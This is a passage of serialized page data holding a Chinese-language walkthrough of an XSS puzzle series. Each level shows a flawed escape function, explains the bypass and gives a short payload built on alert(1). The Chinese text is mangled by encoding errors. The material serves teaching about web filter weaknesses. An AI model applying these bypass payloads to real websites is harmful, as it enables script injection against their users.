text;\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"é¦–å…ˆåˆ†æè¿™é¢˜çš„å¤„ç†æ–¹æ³•\"}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"é¦–å…ˆï¼Œå¯¹äºä»»ä½•è¾“å…¥ï¼Œå…ˆè¿‡æ»¤æ‰\",[\"$\",\"code\",null,{\"children\":\"\u003c\"}],\"å’Œ\",[\"$\",\"code\",null,{\"children\":\"\\\"\"}],\"å˜ä¸ºå®ä½“ç¼–ç \",[\"$\",\"code\",null,{\"children\":\"\u0026lt\"}],\"å’Œ\",[\"$\",\"code\",null,{\"children\":\"\u0026quot\"}],\"ã€‚\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"å¦‚æœå­—ç¬¦ä¸²ä¸­æœ‰åŒ…å«\",[\"$\",\"code\",null,{\"children\":\"http://\"}],\"å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚\",[\"$\",\"code\",null,{\"children\":\"http://xiao.world\"}],\"åˆ™å˜ä¸º\",[\"$\",\"code\",null,{\"children\":\"\u003ca href=\\\"http://xiao.world\\\"\u003ehttp://xiao.world\u003c/a\u003e\"}]]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«\",[\"$\",\"code\",null,{\"children\":\"[[img_src|img_alt]]\"}],\"æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œåˆ™å˜ä¸º\",[\"$\",\"code\",null,{\"children\":\"\u003cimg alt=\\\"img_alt\\\" src=\\\"this_src.git\\\"\u003e\"}]]}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"è¿”å›å­—ç¬¦ä¸²\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å¯¹äºè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºå°–æ‹¬å·å’Œå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ä»è¿™é‡Œå…¥æ‰‹ä¼šæ¯”è¾ƒå›°éš¾ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨ç¬¬äºŒç‚¹å’Œç¬¬ä¸‰ç‚¹çš„è§„åˆ™æ¥åšçªç ´å£ã€‚ä¸ºç”šä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿæ—¢ç„¶è‡ªå·±æ²¡åŠæ³•é—­åˆå±æ€§çš„å¼•å·æˆ–è€…æ ‡ç­¾ï¼Œä½†æ˜¯è§„åˆ™äºŒè½¬æ¢ä¹‹åä¼šå¸¦æœ‰å¼•å·ï¼Œåˆ©ç”¨è¿™ä¸ªå¼•å·ï¼Œå°±å¯ä»¥é—­åˆæ‰è§„åˆ™ä¸‰è½¬æ¢ä¹‹åçš„imgæ ‡ç­¾çš„altå±æ€§äº†ã€‚\\nè¾“å…¥ï¼š\",[\"$\",\"code\",null,{\"children\":\"[[a|http://onerror='alert(1)]]\"}],\"\\nç»è¿‡è§„åˆ™ä¸€è½¬æ¢å:\",[\"$\",\"code\",null,{\"children\":\"[[a|\u003ca href=\\\"http://onerror='alert(1)']]\\\"\u003ehttp://onerror='alert(1)']]\u003c/a\u003e\"}],\"\\nå†ç»è¿‡è§„åˆ™äºŒè½¬æ¢ï¼š \",[\"$\",\"code\",null,{\"children\":\"\u003cimg alt=\\\"\u003ca href=\\\"http://onerror='alert(1)'\\\" src=\\\"a.gif\\\"\u003e\\\"\u003ehttp://onerror='alert(1)']]\u003c/a\u003e\"}],\"\\næ„Ÿè°¢HTMLè¯­è¨€æ¾æ•£çš„ç‰¹æ€§ï¼Œä»¥ä¸Šå³ç›¸å½“äº: \",[\"$\",\"code\",null,{\"children\":\"\u003cimg alt=\\\"\u003ca href=\\\" http:=\\\"\\\" onerror=\\\"alert(1)\\\" \\\"=\\\"\\\" src=\\\"a.gif\\\"\u003e\"}],\"\\nå†ç²¾ç®€ä¸€ç‚¹ï¼Œåªçœ‹å…³é”®éƒ¨åˆ†: \",[\"$\",\"code\",null,{\"children\":\"\u003cimg alt=\\\"\u003ca href=\\\" onerror=\\\"alert(1)\\\" src=\\\"a.git\\\"\u003e\"}],\"\\nè‡³æ­¤ï¼Œå¤§åŠŸå‘ŠæˆğŸ˜„ã€‚\\nsolution(31 chars): \",[\"$\",\"code\",null,{\"children\":\"[[a|http://onerror='alert(1)']]\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"dom\",\"children\":\"DOM\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Slightly too lazy to make two input fields.\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Pass in something like \\\"TextNode#foo\\\"\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" m = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"split\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/#/\"}],\");\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Only slightly contrived at this point.\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" a = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'div'\"}],\");\\n  a.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"appendChild\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\"[\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'create'\"}],\"+m[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"]].\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"apply\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\", m.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"slice\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\")));\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" a.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å…³é”®åœ¨äºç†è§£ç¬¬å…«è¡Œçš„ä»£ç ã€‚\\nå¦‚æœè¾“å…¥ä¸º\",[\"$\",\"code\",null,{\"children\":\"Element#alert\"}],\"\\nç¬¬å…«è¡Œä¸ºï¼š\",[\"$\",\"code\",null,{\"children\":\"document[\\\"createElement\\\"].apply(document, \\\"alert\\\")\"}],\"\\nç›¸å½“äº\",[\"$\",\"code\",null,{\"children\":\"document.createElement(\\\"alert\\\")\"}],\"\\nè¿™æ ·åªæ˜¯åˆ›å»ºäº†ä¸€ä¸ª\",[\"$\",\"code\",null,{\"children\":\"\u003calert\u003e\"}],\"æ ‡ç­¾ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•æ³¨å…¥ã€‚æ‰€ä»¥æŸ¥ä¸€ä¸‹documentæœ‰å“ªäº›createå¼€å¤´çš„æ–¹æ³•ï¼Œä¸€ä¸‹åˆ—å‡ºä¸€äº›å¸¸ç”¨çš„ï¼š\"]}],\"\\n\",[\"$\",\"blockquote\",null,{\"children\":[\"\\n\",[\"$\",\"p\",null,{\"children\":\"createElement\\ncreateTextNode\\ncreateComment\\ncreateAttribute\\ncreateEvent\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é‡Œçœ‹åˆ°æœ‰\",[\"$\",\"code\",null,{\"children\":\"createComment\"}],\"å°±ä»¤äººç‰¹åˆ«å¼€å¿ƒã€‚æ‰€ä»¥ç­”æ¡ˆè§ä¸‹\\nsolution(32 chars): \",[\"$\",\"code\",null,{\"children\":\"Comment#\u003e\u003ciframe onload=alert(1)\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"callback\",\"children\":\"Callback\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Pass inn \\\"callback#userdata\\\"\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" thing = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"split\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/#/\"}],\");\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (!\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/^[a-zA-Z\\\\[\\\\]']*$/\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"])) \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'Invalid callback'\"}],\";\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" obj = {\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'userdata'\"}],\": thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\"] };\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" json = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(obj).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\u003c/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\\\\\\u003c'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\u003cscript\u003e\\\"\"}],\" + thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"] + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"(\\\"\"}],\" + json +\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\")\u003c/script\u003e\\\"\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"éšä¾¿è¾“å…¥ç‚¹çœ‹çœ‹æ•ˆæœå§ï¼š\",[\"$\",\"code\",null,{\"children\":\"input1#input2\"}],\"\\nè¾“å‡º: \",[\"$\",\"code\",null,{\"children\":\"\u003cscript\u003einput1({\\\"userdata\\\":\\\"input2\\\"})\u003c/script\u003e\"}],\"\\nå› ä¸ºinput1æœ‰è¾“å…¥è¦æ±‚ï¼Œä½†æ˜¯input2å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ³¨å…¥å¯ä»¥æ”¾åœ¨input2ï¼Œä½†æ˜¯åœ¨input2ä¹‹å‰æœ‰ä¸€å †å¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œæœ€ç›´æ¥ç®€å•çš„åŠæ³•å°±æ˜¯ç”¨å¼•å·é—­åˆæ‰ä»–ä»¬å°±å¥½äº†ã€‚æ‰€å¹¸input1å¹¶æ²¡æœ‰æŠŠå•å¼•å·è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥ç­”æ¡ˆå°±æ˜¯\\nsolution(15 chars): \",[\"$\",\"code\",null,{\"children\":\"'#';alert(1);//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"skandia\",\"children\":\"Skandia\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"toUpperCase\"}],\"() + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\")\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"é¢˜ç›®çœŸçŸ­ï¼Œä½†å¿ƒæ€æ²¡å°‘èŠ±å‘€ã€‚\\njsçš„æ–¹æ³•åæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œå¦‚æœæŠŠ\",[\"$\",\"code\",null,{\"children\":\"alert\"}],\"å˜ä¸ºäº†\",[\"$\",\"code\",null,{\"children\":\"ALERT\"}],\"ï¼Œé‚£å°±ä¸è¡Œäº†ã€‚ä½†æ˜¯HTMLæ ‡ç­¾åå’Œå±æ€§åæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é—­åˆæ‰\",[\"$\",\"code\",null,{\"children\":\"\u003cscript\u003e\"}],\"æ ‡ç­¾ï¼Œç„¶åè‡ªå·±æ³¨å…¥æ ‡ç­¾ï¼Œåˆ©ç”¨\",[\"$\",\"code\",null,{\"children\":\"onload\"}],\"å±æ€§å‡ºå‘\",[\"$\",\"code\",null,{\"children\":\"alert\"}],\"ï¼Œä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯\",[\"$\",\"code\",null,{\"children\":\"alert\"}],\"å¤§å°å†™æ€ä¹ˆåŠå‘¢ï¼Ÿä¾æˆ‘ä¸ªäººæµ‹è¯•å’Œç†è§£(æš‚æ—¶æœªæ‰¾åˆ°æ ¹æ®)ï¼Œåœ¨å±æ€§å€¼å¤„ä½¿ç”¨å®ä½“ç¼–ç çš„è¯ï¼Œæ˜¯å¯ä»¥è‡ªåŠ¨è§£ç çš„,å…¶ä»–åœ°æ–¹åˆ™ä¸è¡Œã€‚æ‰€ä»¥ï¼Œé—®é¢˜è§£å†³äº†ã€‚\\nsolution(53 chars): \",[\"$\",\"code\",null,{\"children\":\"\u003c/script\u003e\u003ciframe onload=\u0026#x61\u0026#x6C\u0026#x65\u0026#x72\u0026#x74(1)\u003e\"}],\"\\nä½†æˆ‘è¿™ä¸ªè§£ç”¨äº†53ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸æ˜¯æœ€çŸ­çš„ï¼Œä½†æ˜¯æœ‰äººä¹Ÿæœ‰äººåšåˆ°äº†30å¤šå’Œ40å¤šçš„ï¼Œæˆ‘æš‚æ—¶ä¹Ÿæƒ³ä¸åˆ°ä»€ä¹ˆåŠæ³•ã€‚æœ‰çŸ¥é“çš„è¯·å‘Šè¯‰æˆ‘ä¸€å£°ï¼Œè°¢è°¢ğŸ˜„\"]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"template\",\"children\":\"Template\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"htmlEscape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/./g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"x\"}],\") {\\n       \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" { \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c'\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026lt;'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003e'\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026gt;'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026'\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026amp;'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\"'\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026quot;'\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"'\\\"\"}],\": \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u0026#39;'\"}],\" }[x] || x;\\n     });\\n  }\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"expandTemplate\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"template, args\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" template.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/{(\\\\w+)}/g\"}],\",\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"_, n\"}],\") {\\n           \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"htmlEscape\"}],\"(args[n]);\\n         });\\n  }\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"expandTemplate\"}],\"(\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"                                                \\\\n\\\\\\n      \u003ch2\u003eHello, \u003cspan id=name\u003e\u003c/span\u003e!\u003c/h2\u003e         \\\\n\\\\\\n      \u003cscript\u003e                                       \\\\n\\\\\\n         var v = document.getElementById('name');    \\\\n\\\\\\n         v.innerHTML = '\u003ca href=#\u003e{name}\u003c/a\u003e';       \\\\n\\\\\\n      \u003c\\\\/script\u003e                                     \\\\n\\\\\\n    \\\"\"}],\",\\n    { name : s }\\n  );\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"ç®€å•æ¥è¯´ï¼Œå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿‡æ»¤æ‰å°–æ‹¬å·ï¼Œå¼•å·ç­‰ï¼Œç„¶åå°†å¤„ç†å®Œçš„å­—ç¬¦ä¸²æ›¿æ¢æ‰æ¨¡æ¿å­—ç¬¦ä¸²ä¸­\",[\"$\",\"code\",null,{\"children\":\"{name}\"}],\"ã€‚ä½†æ˜¯ç™¾å¯†ä¸€ç–ï¼Œå­—ç¬¦ä¸²ä¸­å¯ä»¥ç”¨8è¿›åˆ¶æˆ–è€…16è¿›åˆ¶æ¥è¡¨ç¤ºå­—ç¬¦ã€‚æ‰€ä»¥ç­”æ¡ˆå°±å‡ºæ¥äº†ã€‚\",[\"$\",\"code\",null,{\"children\":\"\u003c\"}],\"å¯¹åº”çš„å…«è¿›åˆ¶æ˜¯\",[\"$\",\"code\",null,{\"children\":\"\\\\74\"}],\"ã€‚\\nsolution(27): \",[\"$\",\"code\",null,{\"children\":\"\\\\74iframe onload=alert(1)//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"json-\",\"children\":\"JSON ][\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  s = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(s).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\u003c\\\\/script/gi\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log('\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"');\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é“é¢˜ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚æ ¼å¼åŒ–ä¹‹åå†æŠŠ\",[\"$\",\"code\",null,{\"children\":\"\u003c/script\"}],\"æ›¿æ¢æˆç©ºä¸²ã€‚ä½¿ç”¨ä¸€ç‚¹æŠ€å·§å°±å¯ä»¥ç»•è¿‡äº†ã€‚\\nsolution(35): \",[\"$\",\"code\",null,{\"children\":\"\u003c/scr\u003c/scriptipt\u003e\u003cscript\u003ealert(1)//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"callback-\",\"children\":\"Callback ][\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// Pass inn \\\"callback#userdata\\\"\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" thing = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"split\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/#/\"}],\");\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (!\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/^[a-zA-Z\\\\[\\\\]']*$/\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"])) \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'Invalid callback'\"}],\";\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" obj = {\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'userdata'\"}],\": thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\"] };\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" json = \",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"JSON\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"stringify\"}],\"(obj).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\\//g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\\\\\\/'\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\u003cscript\u003e\\\"\"}],\" + thing[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"] + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"(\\\"\"}],\" + json +\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\")\u003c/script\u003e\\\"\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å’Œä¸Šé¢çš„é¢˜ç›®\",[\"$\",\"a\",null,{\"href\":\"#Callback\",\"children\":\"Callback\"}],\"ä¸€æ ·ï¼Œåªæ˜¯å› ä¸ºè¿‡æ»¤äº†\",[\"$\",\"code\",null,{\"children\":\"/\"}],\"ï¼Œä¸èƒ½ç”¨\",[\"$\",\"code\",null,{\"children\":\"//\"}],\"æ³¨é‡Šäº†è€Œå·²ï¼Œé‚£å°±æ¢ä¸€ç§æ³¨é‡Šæ–¹å¼å§\\nsolution(16): \",[\"$\",\"code\",null,{\"children\":\"'#';alert(1)\u003c!--\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"skandia-\",\"children\":\"Skandia ][\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"children\":\"\\nfunction escape(s) {\\n  if (/[\u003c\u003e]/.test(s)) return '-';\\n\\n  return '\u003cscript\u003econsole.log(\\\"' + s.toUpperCase() + '\\\")\u003c/script\u003e';\\n}\\n\"}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"é¦–å…ˆè€ƒè™‘åˆ°å¯ä»¥é—­åˆ\",[\"$\",\"code\",null,{\"children\":\"script\"}],\"æ 